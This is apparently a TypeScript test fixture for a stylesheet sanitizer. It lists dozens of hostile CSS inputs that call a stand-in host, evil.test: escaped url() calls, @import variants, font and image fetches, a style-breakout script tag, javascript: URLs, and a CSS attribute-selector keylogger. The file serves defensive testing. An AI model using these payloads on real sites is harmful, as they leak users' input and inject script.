/**
 * Hostile stylesheets: what Effects' sanitizer must never let fetch
 * (test/unit/effects-sanitize.test.ts), and what an import from a Chord file
 * must never let through either (test/unit/import-file.test.ts).
 */
import { tokenize, TokenType } from '@csstools/css-tokenizer';

/** Anything in `css` that would make Chromium fetch: URL tokens, fetching functions, @import. */
export function fetches(css: string): string[] {
  const found: string[] = [];
  for (const t of tokenize({ css })) {
    if (t[0] === TokenType.URL || t[0] === TokenType.BadURL) found.push(t[1]);
    if (t[0] === TokenType.Function && /^(-[a-z]+-)?(url|src|image|image-set|cross-fade|element|paint)$/i.test(t[4].value)) found.push(t[1]);
    if (t[0] === TokenType.AtKeyword && /^(import|namespace|document)$/i.test(t[4].value)) found.push(t[1]);
  }
  return found;
}

export const EVIL = 'https://evil.test/x';

/** [what it tries, the stylesheet, a piece of what should be left (or '' for nothing at all)] */
export const HOSTILE: [string, string, string][] = [
  ['url()', `body { background: url(${EVIL}) }`, ''],
  ['url() quoted', `body { background: url("${EVIL}") }`, ''],
  ['URL() in capitals', `body { background: URL(${EVIL}) }`, ''],
  ['url() escaped', String.raw`body { background: \75 rl(${EVIL}) }`, ''],
  ['url() escaped, quoted', String.raw`body { background: u\72l("${EVIL}") }`, ''],
  ['URL escaped letter by letter', String.raw`body { background: \55 \52 \4c (${EVIL}) }`, ''],
  ['url() with six-digit escapes', String.raw`body { background: \000075\000072\00006c(${EVIL}) }`, ''],
  ['url() beside a kept declaration', `body { color: red; background: url(${EVIL}); }`, 'color: red !important;'],
  ['@import url()', `@import url(${EVIL}.css); p { color: red }`, 'p {'],
  ['@import a string', `@import "${EVIL}.css";`, ''],
  ['@import escaped', String.raw`@\69mport "${EVIL}.css";`, ''],
  ['@IMPORT', `@IMPORT "${EVIL}.css";`, ''],
  ['@import inside @media', `@media screen { @import "${EVIL}.css"; p { color: red } }`, '@media screen {'],
  ['@import inside @layer', `@layer base { @import "${EVIL}.css"; }`, ''],
  ['@namespace', `@namespace svg url(${EVIL});`, ''],
  ['@font-face source', `@font-face { font-family: X; src: url(${EVIL}.woff2) format("woff2"); }`, 'font-family: X;'],
  ['@font-face local, then a url', `@font-face { font-family: X; src: local(Arial), url(${EVIL}.woff); }`, 'font-family: X;'],
  ['image-set()', `body { background-image: image-set("${EVIL}.png" 1x) }`, ''],
  ['-webkit-image-set()', `body { background-image: -webkit-image-set(url(${EVIL}.png) 1x) }`, ''],
  ['cross-fade()', `body { background: cross-fade(url(a.png), url(b.png), 50%) }`, ''],
  ['image()', `body { list-style-image: image("${EVIL}.png") }`, ''],
  ['element()', 'body { background: element(#x) }', ''],
  ['paint()', 'body { background: paint(worklet) }', ''],
  ['src()', `body { background: src("${EVIL}") }`, ''],
  ['cursor', `body { cursor: url(${EVIL}.cur), auto }`, ''],
  ['filter with an SVG', `p { filter: url(${EVIL}.svg#f) }`, ''],
  ['a url in a custom property', `body { --bg: url(${EVIL}) } p { background: var(--bg) }`, 'background: var(--bg) !important;'],
  ['a url as var() fallback', `p { background: var(--missing, url(${EVIL})) }`, ''],
  ['image-set in a custom property', `p { --x: image-set("${EVIL}" 1x) }`, ''],
  ['typed attr()', 'p { background: attr(data-bg type(<url>)) }', ''],
  ['attr() as a url', 'p { background: attr(data-bg url) }', ''],
  ['a bad url', 'p { background: url(a"b) }', ''],
  ['a url that never ends', `p { background: url(${EVIL}`, ''],
  // As in Chromium: the broken declaration goes, the next one stays.
  ['a string that breaks a line', 'p { content: "abc\n; color: red }', 'p {\n  color: red !important;\n}'],
  ['a comment inside url', `p { background: u/**/rl(${EVIL}) }`, ''],
  ['a comment before the paren', 'p { background: url/**/(x) }', 'url/**/(x)'],
  ['an escaped property name', String.raw`p { b\61 ckground: url(${EVIL}) }`, ''],
  ['a null byte', String.raw`p { background: u\0rl(${EVIL}) }`, ''],
  ['an escaped paren', String.raw`p { background: url\(x) }`, ''],
  ['breaking out of a rule', `p { color: red } } @import "${EVIL}"; q { color: blue }`, 'p {'],
  ['HTML', '</style><script>alert(1)</script>', ''],
  ['@supports with a url', `@supports (background: url(${EVIL})) { p { color: red } }`, ''],
  ['@media with a url', `@media url(${EVIL}) { p { color: red } }`, ''],
  ['@document', `@document url-prefix(${EVIL}) { p { color: red } }`, ''],
  ['behavior', 'p { behavior: url(x.htc); behavior: none; }', ''],
  ['-moz-binding', `p { -moz-binding: url(${EVIL}.xml#x) }`, ''],
  ['expression()', 'p { width: expression(alert(1)) }', ''],
  ['javascript: in a url', 'p { background: url(javascript:alert(1)) }', ''],
  ['the keylogger', `input[value^="a"] { background: url(${EVIL}?a) }`, ''],
  ['nested, with a url', `p { & a { background: url(${EVIL}) } color: red }`, 'color: red !important;'],
  ['@keyframes with a url', `@keyframes k { from { background: url(${EVIL}) } to { color: red } }`, '@keyframes k {'],
  ['@import inside @keyframes', `@keyframes k { @import "${EVIL}"; to { color: red } }`, 'to {'],
  ['@charset', '@charset "utf-8"; p { color: red }', 'p {'],
  ['a url in a selector', `a url("${EVIL}") { color: red }`, ''],
  ['a fetching pseudo-function lookalike', `a:url("${EVIL}") { color: red }`, ''],
  ['an image-set after a colon', `p { background:image-set("${EVIL}" 1x) }`, ''],
  ['a counter style', `@counter-style x { symbols: url(${EVIL}); }`, ''],
  ['@property', `@property --x { syntax: "<url>"; inherits: false; initial-value: url(${EVIL}); }`, ''],
  ['@page', `@page { background: url(${EVIL}) }`, ''],
  ['a string pretending to be a url', 'p::after { content: "url(https://evil.test/x)" }', 'content: "url(https://evil.test/x)" !important;'],
];
